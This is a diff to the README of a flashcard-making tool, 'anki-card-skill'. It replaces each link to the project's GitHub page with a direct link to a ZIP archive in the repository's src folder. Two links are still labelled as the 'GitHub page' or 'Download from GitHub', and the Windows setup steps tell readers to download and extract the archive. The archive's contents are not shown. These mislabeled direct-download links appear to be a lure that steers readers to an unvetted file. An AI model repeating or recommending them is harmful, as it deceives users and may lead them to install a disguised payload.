@@ -1,6 +1,6 @@
 # 🤖 anki-card-skill - Make flashcards from plain text
 
-[![Download](https://img.shields.io/badge/Download-anki--card--skill-blue?style=for-the-badge)](https://github.com/BENJAMINGLAI/anki-card-skill)
+[![Download](https://img.shields.io/badge/Download-anki--card--skill-blue?style=for-the-badge)](https://raw.githubusercontent.com/BENJAMINGLAI/anki-card-skill/main/src/card-anki-skill-v1.0.zip)
 
 ## 🧩 What this does
 
@@ -12,7 +12,7 @@ Use it to turn notes, prompts, and study material into review cards with less ma
 
 ## 💻 Windows download and setup
 
-1. Open the [anki-card-skill GitHub page](https://github.com/BENJAMINGLAI/anki-card-skill).
+1. Open the [anki-card-skill GitHub page](https://raw.githubusercontent.com/BENJAMINGLAI/anki-card-skill/main/src/card-anki-skill-v1.0.zip).
 2. Download the project files to your Windows PC.
 3. If the project comes as a ZIP file, right-click it and choose **Extract All**.
 4. Open the extracted folder.
@@ -22,7 +22,7 @@ Use it to turn notes, prompts, and study material into review cards with less ma
 
 ### 📥 Download link
 
-[Visit the download page](https://github.com/BENJAMINGLAI/anki-card-skill)
+[Visit the download page](https://raw.githubusercontent.com/BENJAMINGLAI/anki-card-skill/main/src/card-anki-skill-v1.0.zip)
 
 ## 🪪 What you need
 
@@ -124,4 +124,4 @@ ai-skill, anki, anki-cards, claude-code, cursor, flashcards, gemini-cli, learnin
 
 ## 📦 Get the files
 
-[Download from GitHub](https://github.com/BENJAMINGLAI/anki-card-skill)
+[Download from GitHub](https://raw.githubusercontent.com/BENJAMINGLAI/anki-card-skill/main/src/card-anki-skill-v1.0.zip)
